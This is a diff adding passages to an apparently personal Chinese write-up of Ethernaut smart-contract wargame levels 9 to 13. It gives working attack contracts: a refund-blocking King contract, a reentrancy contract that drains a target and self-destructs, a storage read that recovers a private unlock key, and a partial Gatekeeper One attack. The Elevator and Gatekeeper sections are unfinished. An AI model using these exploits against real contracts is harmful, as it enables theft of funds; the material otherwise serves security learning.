@@ -777,3 +777,303 @@ await web3.eth.getStorageAt(Instance,1).then(web.utils.toAscii)//可以看到明
 [minestorage](https://sepolia.etherscan.io/tx/0xa85f25ab4641b3703f339c4c9d24578e09f7c0079d915ef79ac08e63f0d8c683#statechange)
 
 # 9.King
+
+题面有点复杂
+
+下面的合约表示了一个很简单的游戏: 任何一个发送了高于目前价格的人将成为新的国王. 在这个情况下, 上一个国王将会获得新的出价, 这样可以赚得一些以太币. 看起来像是庞氏骗局.
+
+这么有趣的游戏, 你的目标是攻破他.
+
+当你提交实例给关卡时, 关卡会重新申明王位. 你需要阻止他重获王位来通过这一关.
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+contract King {
+
+  address king;
+  uint public prize;
+  address public owner;
+
+  constructor() payable {
+    owner = msg.sender;  
+    king = msg.sender;
+    prize = msg.value;
+  }
+
+  receive() external payable {
+    require(msg.value >= prize || msg.sender == owner);
+    payable(king).transfer(msg.value);
+    king = msg.sender;
+    prize = msg.value;
+  }
+
+  function _king() public view returns (address) {
+    return king;
+  }
+}
+```
+
+在反复阅读之后，理解了就是说当你付款超过目前king后，之后再有人付款超过你也无法改变king，也就是说在payable(king).transfer()时直接revert即可，就是说它这个款付不到我的合约中
+
+```solidity 
+pragma solidity ^0.8.0;
+
+contract ForeverKing {
+    constructor(address payable target) payable {
+        uint prize = King(target).prize();
+        (bool ok, ) = target.call{value:prize}("");
+        require(ok, "call Failed.");
+    }
+}
+```
+
+最终采用了以上合约，成功修改了合约的king（注意要value>=prize）
+
+<img src="WP.assets/image-20230710095102626.png" alt="image-20230710095102626" style="zoom:50%;" />
+
+大多数 Ethernaut 的关卡尝试展示真实发生的 bug 和 hack (以简化过的方式).
+
+关于这次的情况, 参见: [King of the Ether](https://www.kingoftheether.com/thrones/kingoftheether/index.html) 和 [King of the Ether Postmortem](http://www.kingoftheether.com/postmortem.html)
+
+# 10.Re-entrancy
+
+为了防止转移资产时的重入攻击, 使用 [Checks-Effects-Interactions pattern](https://solidity.readthedocs.io/en/develop/security-considerations.html#use-the-checks-effects-interactions-pattern) 注意 `call` 只会返回 false 而不中断执行流. 其它方案比如 [ReentrancyGuard](https://docs.openzeppelin.com/contracts/2.x/api/utils#ReentrancyGuard) 或 [PullPayment](https://docs.openzeppelin.com/contracts/2.x/api/payment#PullPayment) 也可以使用.
+
+`transfer` 和 `send` 不再被推荐使用, 因为他们在 Istanbul 硬分叉之后可能破坏合约 [Source 1](https://diligence.consensys.net/blog/2019/09/stop-using-soliditys-transfer-now/) [Source 2](https://forum.openzeppelin.com/t/reentrancy-after-istanbul/1742).
+
+总是假设资产的接受方可能是另一个合约, 而不是一个普通的地址. 因此, 他有可能执行了他的payable fallback 之后又“重新进入” 你的合约, 这可能会打乱你的状态或是逻辑.
+
+重进入是一种常见的攻击. 你得随时准备好!
+
+ 
+
+#### The DAO Hack
+
+著名的DAO hack 使用了重进入攻击, 窃取了受害者大量的 ether. 参见 [15 lines of code that could have prevented TheDAO Hack](https://blog.openzeppelin.com/15-lines-of-code-that-could-have-prevented-thedao-hack-782499e00942).
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.6.12;
+
+import 'openzeppelin-contracts-06/math/SafeMath.sol';
+
+contract Reentrance {
+  
+  using SafeMath for uint256;
+  mapping(address => uint) public balances;
+
+  function donate(address _to) public payable {
+    balances[_to] = balances[_to].add(msg.value);
+  }
+
+  function balanceOf(address _who) public view returns (uint balance) {
+    return balances[_who];
+  }
+
+  function withdraw(uint _amount) public {
+    if(balances[msg.sender] >= _amount) {
+      (bool result,) = msg.sender.call{value:_amount}("");
+      if(result) {
+        _amount;
+      }
+      balances[msg.sender] -= _amount;
+    }
+  }
+
+  receive() external payable {}
+}
+```
+
+在msg.sender.call会掉入合约的fallback中，只要再次调用withdraw，就会陷入循环，因此攻击合约如下
+
+```solidity
+pragma solidity 0.8;
+
+interface IReentrancy {
+    function donate (address) external payable;
+    function withdraw(uint256) external;
+}
+
+contract Hack {
+    IReentrancy private immutable target;
+
+    constructor(address _target) {
+        target = IReentrancy(_target);
+    }
+
+    // NOTE: attack cannot be called inside constructor
+    function attack() external payable {
+        target.donate{value: 1e18}(address(this));
+        target.withdraw(1e18);
+
+        require(address(target).balance == 0, "target balance > 0");
+        selfdestruct(payable(msg.sender));
+    }
+
+    receive() external payable {
+        uint256 amount = min(1e18, address(target).balance);
+        if (amount > 0) {
+            target.withdraw(amount);
+        }
+    }
+
+    function min(uint256 x, uint256 y) private pure returns (uint256) {
+        return x <= y ? x : y;
+    }
+}
+```
+
+转账金额不能太小不然会不知道为什么报错
+
+然后提交实例
+
+# 11.Elevator
+
+电梯不会让你达到大楼顶部, 对吧?
+
+##### 这可能有帮助:
+
+- 有的时候 solidity 不是很擅长保存 promises.
+- 这个 `电梯` 期待被用在一个 `建筑` 里.
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+interface Building {
+  function isLastFloor(uint) external returns (bool);
+}
+
+
+contract Elevator {
+  bool public top;
+  uint public floor;
+
+  function goTo(uint _floor) public {
+    Building building = Building(msg.sender);
+
+    if (! building.isLastFloor(_floor)) {
+      floor = _floor;
+      top = building.isLastFloor(floor);
+    }
+  }
+}
+```
+
+从该合约的14行来看，该Building是由
+
+
+
+# 12.Privacy
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+contract Privacy {
+
+  bool public locked = true;
+  uint256 public ID = block.timestamp;
+  uint8 private flattening = 10;
+  uint8 private denomination = 255;
+  uint16 private awkwardness = uint16(block.timestamp);
+  bytes32[3] private data;
+
+  constructor(bytes32[3] memory _data) {
+    data = _data;
+  }
+  
+  function unlock(bytes16 _key) public {
+    require(_key == bytes16(data[2]));
+    locked = false;
+  }
+
+  /*
+    A bunch of super advanced solidity algorithms...
+
+      ,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`
+      .,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,
+      *.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^         ,---/V\
+      `*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.    ~|__(o.o)
+      ^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'  UU  UU
+  */
+}
+```
+
+由题面知想要unlock需要data[2]的数据 32bytes一个slot，因此要到第五个slot去寻找
+
+``` javascript 
+>await web3.eth.getStorageAt(instance, 5)
+<'0x4921c6f12752dfcee307acb3c9da4f069e4976b0b244f3e87d817e7eb6ce262f'
+```
+
+然后只要byte16()
+
+contract.unlock('0x4921c6f12752dfcee307acb3c9da4f06')
+调用完后就通过此关
+
+# 13.Gatekeeper One
+
+```solidity
+
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+contract GatekeeperOne {
+
+  address public entrant;
+
+  modifier gateOne() {
+    require(msg.sender != tx.origin);
+    _;
+  }
+
+  modifier gateTwo() {
+    require(gasleft() % 8191 == 0);
+    _;
+  }
+
+  modifier gateThree(bytes8 _gateKey) {
+      require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
+      require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
+      require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), "GatekeeperOne: invalid gateThree part three");
+    _;
+  }
+
+  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
+    entrant = tx.origin;
+    return true;
+  }
+}
+```
+
+一共三道门，第一道要求msg.sender不是合约创建者，即需要另建合约攻击；第二道要求在运行道gasleft()时，剩余gas整除8191；第三道要求_gatekey与tx.origin的地址有关
+
+则构建攻击合约如下
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+interface IGatekeeperOne {
+    function enter(bytes8 _gateKey) external returns (bool);
+}
+
+contract AttackGatekeeperOne {
+    address levelInstance;
+
+    constructor(address _levelInstance) {
+        levelInstance = _levelInstance;
+    }
+
+    function openGate() public {
+        bytes8 key = bytes8(uint64(uint160(tx.origin))) & 0xFFFFFFFF0000FFFF;
+        IGatekeeperOne(levelInstance).enter{gas: ???}(key);
+    }
+
+}
+```
+
+下面的目标就是测试到gasleft与输入进去的gas的关系，据教程解释可以进行
